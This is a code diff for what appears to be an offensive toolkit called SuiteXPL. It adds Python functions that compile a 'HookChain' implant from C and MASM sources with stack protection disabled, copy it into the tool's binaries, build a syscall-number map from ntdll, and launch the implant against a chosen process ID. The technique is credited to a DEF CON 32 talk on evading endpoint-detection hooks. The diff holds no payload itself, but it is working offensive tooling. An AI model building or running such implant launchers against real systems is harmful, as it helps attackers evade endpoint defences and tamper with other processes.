@@ -440,3 +440,147 @@ def try_compile_hookchain(timeout: int = 90) -> dict:
         "error": "no C compiler",
         "recipe": f"gcc {src} -o hookchain_finder64 -ldbghelp",
     }
+
+
+def _embedxpl_bin_dir() -> Path:
+    return Path(__file__).resolve().parents[2] / "resources" / "bin"
+
+
+def implant_binary() -> Optional[Path]:
+    """Locate the compiled HookChain implant (MSVC + MASM)."""
+    names = ("hookchain_msg.exe", "HookChain_msg.exe")
+    candidates: list[Path] = []
+    bindir = _embedxpl_bin_dir()
+    for name in names:
+        candidates.append(bindir / name)
+    src = hookchain_source_dir()
+    if src:
+        for rel in (
+            Path("HookChain") / "x64" / "Release" / "HookChain_msg.exe",
+            Path("HookChain") / "HookChain" / "x64" / "Release" / "HookChain_msg.exe",
+        ):
+            candidates.append(src / rel)
+    for path in candidates:
+        if path.is_file() and path.stat().st_size > 1024:
+            return path
+    return None
+
+
+def try_compile_hookchain_implant(timeout: int = 120) -> dict:
+    """Compile HookChain_msg.exe with VS 2019 Build Tools (cl + ml64)."""
+    existing = implant_binary()
+    if existing:
+        return {"ok": True, "binary": str(existing), "built": False}
+
+    if sys.platform != "win32":
+        return {
+            "ok": False,
+            "error": "implant compile requires Windows MSVC + MASM",
+            "recipe": r'vcvars64.bat && ml64 /c hookchain.asm && cl /c hook.c main.c && link',
+        }
+
+    src = hookchain_source_dir()
+    if src is None:
+        return {"ok": False, "error": "hookchain source not found"}
+    src_dir = src / "HookChain" / "HookChain"
+    if not (src_dir / "hookchain.asm").is_file():
+        return {"ok": False, "error": f"missing asm at {src_dir}"}
+
+    vcvars = Path(r"C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\VC\Auxiliary\Build\vcvars64.bat")
+    if not vcvars.is_file():
+        return {"ok": False, "error": f"vcvars64 not found: {vcvars}"}
+
+    out_dir = src / "HookChain" / "x64" / "Release"
+    dst_dir = _embedxpl_bin_dir()
+    out_dir.mkdir(parents=True, exist_ok=True)
+    dst_dir.mkdir(parents=True, exist_ok=True)
+    out_exe = out_dir / "HookChain_msg.exe"
+    dst_exe = dst_dir / "hookchain_msg.exe"
+
+    script = (
+        f'call "{vcvars}" && '
+        f'cd /d "{src_dir}" && '
+        f'ml64 /c /nologo /Fo"{out_dir / "hookchain.obj"}" hookchain.asm && '
+        f'cl /nologo /c /W3 /Od /GS- /D NDEBUG /D _CONSOLE /D UNICODE /D _UNICODE /TC '
+        f'/I "{src_dir}" /Fo"{out_dir / "hook.obj"}" hook.c && '
+        f'cl /nologo /c /W3 /Od /GS- /D NDEBUG /D _CONSOLE /D UNICODE /D _UNICODE /TC '
+        f'/I "{src_dir}" /Fo"{out_dir / "main.obj"}" main.c && '
+        f'link /nologo /SUBSYSTEM:CONSOLE /MACHINE:X64 /OUT:"{out_exe}" '
+        f'"{out_dir / "hook.obj"}" "{out_dir / "main.obj"}" "{out_dir / "hookchain.obj"}" '
+        f'kernel32.lib user32.lib'
+    )
+    try:
+        result = subprocess.run(
+            ["cmd.exe", "/c", script],
+            capture_output=True, text=True, timeout=timeout,
+        )
+    except (FileNotFoundError, subprocess.TimeoutExpired) as exc:
+        return {"ok": False, "error": str(exc)}
+
+    if result.returncode == 0 and out_exe.is_file():
+        try:
+            dst_exe.write_bytes(out_exe.read_bytes())
+        except OSError as exc:
+            return {"ok": True, "binary": str(out_exe), "built": True, "copy_error": str(exc)}
+        return {"ok": True, "binary": str(dst_exe), "built": True}
+
+    return {
+        "ok": False,
+        "returncode": result.returncode,
+        "stderr_tail": (result.stderr or result.stdout or "")[-400:],
+    }
+
+
+class HookChainImplant:
+    """SuiteXPL handle for the compiled HookChain implant (C + MASM).
+
+    Python owns SSN/PE analysis. The PE is the compiled accelerator.
+    """
+
+    def __init__(self) -> None:
+        self.path = implant_binary()
+
+    def ensure(self) -> dict:
+        if self.path and self.path.is_file():
+            return {"ok": True, "binary": str(self.path), "built": False}
+        built = try_compile_hookchain_implant()
+        if built.get("ok"):
+            self.path = Path(str(built["binary"]))
+        return built
+
+    def status(self) -> dict:
+        analyzer = HookChainAnalyzer()
+        info = {
+            "binary": str(self.path) if self.path else None,
+            "present": bool(self.path and self.path.is_file()),
+            "finder": str(try_compile_hookchain().get("binary") or ""),
+            "credits": "helviojunior/hookchain (DEF CON 32 / BlackHat Toronto)",
+        }
+        if analyzer.is_available():
+            info["ntdll"] = str(analyzer.ntdll_path)
+            info["ssn_map"] = analyzer.generate_ssn_map()
+        return info
+
+    def run(self, pid: int, timeout: int = 20) -> dict:
+        """Invoke the compiled implant against a PID. Requires Windows."""
+        ready = self.ensure()
+        if not ready.get("ok") or not self.path:
+            return {"ok": False, "error": ready.get("error", "implant missing")}
+        if not isinstance(pid, int) or pid <= 0:
+            return {"ok": False, "error": "pid must be a positive integer"}
+        try:
+            result = subprocess.run(
+                [str(self.path), str(pid)],
+                capture_output=True, text=True, timeout=timeout,
+                encoding="utf-8", errors="replace",
+            )
+        except (FileNotFoundError, subprocess.TimeoutExpired) as exc:
+            return {"ok": False, "error": str(exc), "binary": str(self.path)}
+        return {
+            "ok": result.returncode == 0,
+            "pid": pid,
+            "returncode": result.returncode,
+            "stdout": (result.stdout or "")[-2000:],
+            "stderr": (result.stderr or "")[-400:],
+            "binary": str(self.path),
+        }
